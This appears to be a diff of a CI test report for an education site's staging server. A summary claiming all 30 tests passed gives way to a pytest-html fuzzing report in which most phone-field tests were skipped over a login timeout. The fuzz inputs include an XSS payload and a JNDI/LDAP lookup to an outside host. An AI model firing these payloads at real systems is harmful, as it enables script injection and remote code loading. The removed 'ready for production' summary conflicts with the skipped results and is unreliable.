-  <div class="badge-row">
-    <span class="pill run">Run #116</span>
-    <span class="pill">dev.mehadedu.com/en</span>
-    <span class="pill ok">Ready for production</span>
-  </div>
-  <h1>all 30 tests passed</h1>
-  <div class="commit-meta">
-    <span><b>Date:</b> 2026-06-18 09:50:58</span>
-    <span><b>Model:</b> unknown</span>
-    <span><b>Specs:</b> 1</span>
-    <span><b>Tests:</b> 30</span>
-  </div>
-  <p style="font-size:13px;color:var(--ink-2);margin-bottom:16px">AI-driven spec validation completed successfully on https://dev.mehadedu.com/en. All 30 tests passed across 1 spec(s).</p>
-  <span class="stamp pass-stamp">Ready</span>
-</section>
+.media-container--fullscreen {
+  grid-template-columns: 0px auto 0px;
+}
 
-<!-- ── Quality overview ── -->
-<section class="card">
-  <div class="card-head">
-    <h4>Quality Overview</h4>
-    <span style="font-size:12px;color:var(--ink-3)">30/30 passing</span>
-  </div>
-  <div class="card-body">
-    <div class="diff-rows">
-      <div class="diff-row up">
-        <span class="sym">+</span>
-        <span class="lbl">Pass rate</span>
-        <span class="val">100.0%</span>
+.media-container__nav--right,
+.media-container__nav--left {
+  text-align: center;
+  cursor: pointer;
+}
+
+.media-container__viewport {
+  cursor: pointer;
+  text-align: center;
+  height: inherit;
+}
+.media-container__viewport img,
+.media-container__viewport video {
+  object-fit: cover;
+  width: 100%;
+  max-height: 100%;
+}
+
+.media__name,
+.media__counter {
+  display: flex;
+  flex-direction: row;
+  justify-content: space-around;
+  flex: 0 0 25px;
+  align-items: center;
+}
+
+.collapsible td:not(.col-links) {
+  cursor: pointer;
+}
+.collapsible td:not(.col-links):hover::after {
+  color: #bbb;
+  font-style: italic;
+  cursor: pointer;
+}
+
+.col-result {
+  width: 130px;
+}
+.col-result:hover::after {
+  content: " (hide details)";
+}
+
+.col-result.collapsed:hover::after {
+  content: " (show details)";
+}
+
+#environment-header h2:hover::after {
+  content: " (hide details)";
+  color: #bbb;
+  font-style: italic;
+  cursor: pointer;
+  font-size: 12px;
+}
+
+#environment-header.collapsed h2:hover::after {
+  content: " (show details)";
+  color: #bbb;
+  font-style: italic;
+  cursor: pointer;
+  font-size: 12px;
+}
+
+/*------------------
+ * 3. Sorting items
+ *------------------*/
+.sortable {
+  cursor: pointer;
+}
+.sortable.desc:after {
+  content: " ";
+  position: relative;
+  left: 5px;
+  bottom: -12.5px;
+  border: 10px solid #4caf50;
+  border-bottom: 0;
+  border-left-color: transparent;
+  border-right-color: transparent;
+}
+.sortable.asc:after {
+  content: " ";
+  position: relative;
+  left: 5px;
+  bottom: 12.5px;
+  border: 10px solid #4caf50;
+  border-top: 0;
+  border-left-color: transparent;
+  border-right-color: transparent;
+}
+
+.hidden, .summary__reload__button.hidden {
+  display: none;
+}
+
+.summary__data {
+  flex: 0 0 550px;
+}
+.summary__reload {
+  flex: 1 1;
+  display: flex;
+  justify-content: center;
+}
+.summary__reload__button {
+  flex: 0 0 300px;
+  display: flex;
+  color: white;
+  font-weight: bold;
+  background-color: #4caf50;
+  text-align: center;
+  justify-content: center;
+  align-items: center;
+  border-radius: 3px;
+  cursor: pointer;
+}
+.summary__reload__button:hover {
+  background-color: #46a049;
+}
+.summary__spacer {
+  flex: 0 0 550px;
+}
+
+.controls {
+  display: flex;
+  justify-content: space-between;
+}
+
+.filters,
+.collapse {
+  display: flex;
+  align-items: center;
+}
+.filters button,
+.collapse button {
+  color: #999;
+  border: none;
+  background: none;
+  cursor: pointer;
+  text-decoration: underline;
+}
+.filters button:hover,
+.collapse button:hover {
+  color: #ccc;
+}
+
+.filter__label {
+  margin-right: 10px;
+}
+
+      </style>
+    
+  </head>
+  <body>
+    <h1 id="title">qa20-fuzzing.html</h1>
+    <p>Report generated on 19-Jun-2026 at 05:57:27 by <a href="https://pypi.python.org/pypi/pytest-html">pytest-html</a>
+        v4.2.0</p>
+    <div id="environment-header">
+      <h2>Environment</h2>
+    </div>
+    <table id="environment"></table>
+    <!-- TEMPLATES -->
+      <template id="template_environment_row">
+      <tr>
+        <td></td>
+        <td></td>
+      </tr>
+    </template>
+    <template id="template_results-table__body--empty">
+      <tbody class="results-table-row">
+        <tr id="not-found-message">
+          <td colspan="4">No results found. Check the filters.</td>
+        </tr>
+      </tbody>
+    </template>
+    <template id="template_results-table__tbody">
+      <tbody class="results-table-row">
+        <tr class="collapsible">
+        </tr>
+        <tr class="extras-row">
+          <td class="extra" colspan="4">
+            <div class="extraHTML"></div>
+            <div class="media">
+              <div class="media-container">
+                  <div class="media-container__nav--left">&lt;</div>
+                  <div class="media-container__viewport">
+                    <img src="" />
+                    <video controls>
+                      <source src="" type="video/mp4">
+                    </video>
+                  </div>
+                  <div class="media-container__nav--right">&gt;</div>
+                </div>
+                <div class="media__name"></div>
+                <div class="media__counter"></div>
+            </div>
+            <div class="logwrapper">
+              <div class="logexpander"></div>
+              <div class="log"></div>
+            </div>
+          </td>
+        </tr>
+      </tbody>
+    </template>
+    <!-- END TEMPLATES -->
+    <div class="summary">
+      <div class="summary__data">
+        <h2>Summary</h2>
+        <div class="additional-summary prefix">
+        </div>
+        <p class="run-count">2 tests took 00:16:35.</p>
+        <p class="filter">(Un)check the boxes to filter the results.</p>
+        <div class="summary__reload">
+          <div class="summary__reload__button hidden" onclick="location.reload()">
+            <div>There are still tests running. <br />Reload this page to get the latest results!</div>
+          </div>
+        </div>
+        <div class="summary__spacer"></div>
+        <div class="controls">
+          <div class="filters">
+            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="failed" disabled>
+            <span class="failed">0 Failed,</span>
+            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="passed" >
+            <span class="passed">2 Passed,</span>
+            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="skipped" >
+            <span class="skipped">30 Skipped,</span>
+            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="xfailed" disabled>
+            <span class="xfailed">0 Expected failures,</span>
+            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="xpassed" disabled>
+            <span class="xpassed">0 Unexpected passes,</span>
+            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="error" disabled>
+            <span class="error">0 Errors,</span>
+            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="rerun" disabled>
+            <span class="rerun">0 Reruns</span>
+            <input checked="true" class="filter" name="filter_checkbox" type="checkbox" data-test-result="retried" disabled>
+            <span class="retried">0 Retried,</span>
+          </div>
+          <div class="collapse">
+            <button id="show_all_details">Show all details</button>&nbsp;/&nbsp;<button id="hide_all_details">Hide all details</button>
+          </div>
+        </div>
       </div>
-      <div class="diff-row neutral">
-        <span class="sym">·</span>
-        <span class="lbl">Failing tests</span>
-        <span class="val">0</span>
+      <div class="additional-summary summary">
       </div>
-      <div class="diff-row neutral">
-        <span class="sym">·</span>
-        <span class="lbl">P0 critical bugs</span>
-        <span class="val">0</span>
-      </div>
-      <div class="diff-row neutral">
-        <span class="sym">·</span>
-        <span class="lbl">P1 high bugs</span>
-        <span class="val">0</span>
+      <div class="additional-summary postfix">
       </div>
     </div>
-  </div>
-</section>
+    <table id="results-table">
+      <thead id="results-table-head">
+        <tr>
+          <th class="sortable" data-column-type="result">Result</th>
+          <th class="sortable" data-column-type="testId">Test</th>
+          <th class="sortable" data-column-type="duration">Duration</th>
+          <th>Links</th>
+        </tr>
+      </thead>
+    </table>
+  <footer>
+    <div id="data-container" data-jsonblob="{&#34;environment&#34;: {&#34;Python&#34;: &#34;3.12.13&#34;, &#34;Platform&#34;: &#34;Linux-6.17.0-1018-azure-x86_64-with-glibc2.39&#34;, &#34;Packages&#34;: {&#34;pytest&#34;: &#34;9.1.0&#34;, &#34;pluggy&#34;: &#34;1.6.0&#34;}, &#34;Plugins&#34;: {&#34;json-report&#34;: &#34;1.5.0&#34;, &#34;timeout&#34;: &#34;2.4.0&#34;, &#34;playwright&#34;: &#34;0.8.0&#34;, &#34;metadata&#34;: &#34;3.1.1&#34;, &#34;base-url&#34;: &#34;2.1.0&#34;, &#34;html&#34;: &#34;4.2.0&#34;}, &#34;CI&#34;: &#34;true&#34;, &#34;JAVA_HOME&#34;: &#34;/usr/lib/jvm/temurin-17-jdk-amd64&#34;, &#34;Base URL&#34;: &#34;&#34;}, &#34;tests&#34;: {&#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa0]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa0]&#34;, &#34;duration&#34;: &#34;00:00:36&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaa0]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:36&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    49 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms\\n    - waiting for element to be visible, enabled and stable\\n    - element is visible, enabled and stable\\n    - scrolling into view if needed&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;N&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;N&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;N&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    49 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms\\n    - waiting for element to be visible, enabled and stable&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;&lt;img src=x onerror=alert(1)&gt;&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;&lt;img src=x onerror=alert(1)&gt;&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;&lt;img src=x onerror=alert(1)&gt;&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    49 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;  \\\\n\\\\r  &#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;  \\\\n\\\\r  &#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;  \\\\n\\\\r  &#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;enq522wjZRL9OaYsP6ihgIqLSmNqE]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;enq522wjZRL9OaYsP6ihgIqLSmNqE]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;enq522wjZRL9OaYsP6ihgIqLSmNqE]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;1e308&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;1e308&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;1e308&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    49 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;3fAbnFbmOHnKYaXRvj7uff0LYTH8x]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;3fAbnFbmOHnKYaXRvj7uff0LYTH8x]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;3fAbnFbmOHnKYaXRvj7uff0LYTH8x]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    49 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms\\n    - waiting for element to be visible, enabled and stable&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;${jndi:ldap://x.com/a}&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;${jndi:ldap://x.com/a}&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Skipped&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;${jndi:ldap://x.com/a}&#39;]&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;00:00:33&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;(&amp;#x27;/home/runner/work/mehad-automation/mehad-automation/tests/test_qa_comprehensive.py&amp;#x27;, 4068, &amp;#x27;Skipped: Could not open login modal \u2014 staging issue: Locator.click: Timeout 30000ms exceeded.\\nCall log:\\n  - waiting for locator(&amp;quot;button:not([aria-label=\\\\&amp;quot;Login\\\\&amp;quot;]):has-text(\\\\&amp;quot;Log In\\\\&amp;quot;), button:not([aria-label]):has-text(\\\\&amp;quot;Login\\\\&amp;quot;), button[aria-label=\\\\&amp;quot;\u062a\u0633\u062c\u064a\u0644 \u0627\u0644\u062f\u062e\u0648\u0644\\\\&amp;quot;]&amp;quot;).last\\n    - locator resolved to &amp;lt;button type=&amp;quot;button&amp;quot; class=&amp;quot;hb-login-mb&amp;quot; aria-label=&amp;quot;Log In&amp;quot;&amp;gt;\u2026&amp;lt;/button&amp;gt;\\n  - attempting click action\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n    - waiting 20ms\\n    2 \u00d7 waiting for element to be visible, enabled and stable\\n      - element is visible, enabled and stable\\n      - scrolling into view if needed\\n      - done scrolling\\n      - element is outside of the viewport\\n    - retrying click action\\n      - waiting 100ms\\n    50 \u00d7 waiting for element to be visible, enabled and stable\\n       - element is visible, enabled and stable\\n       - scrolling into view if needed\\n       - done scrolling\\n       - element is outside of the viewport\\n     - retrying click action\\n       - waiting 500ms&amp;#x27;)\n&#34;}], &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;00000000000000000000&#39;]&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Skipped&#34;, &#34;testId&#34;: &#34;tests/test_qa_comprehensive.py::TestQA20PropertyBasedFuzzing::test_qa20_phone_field_invariants[chromium-&#39;00000000000000000000&#39;]&#34;, &#34;duration&#34;: &#34;00:00:33&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td 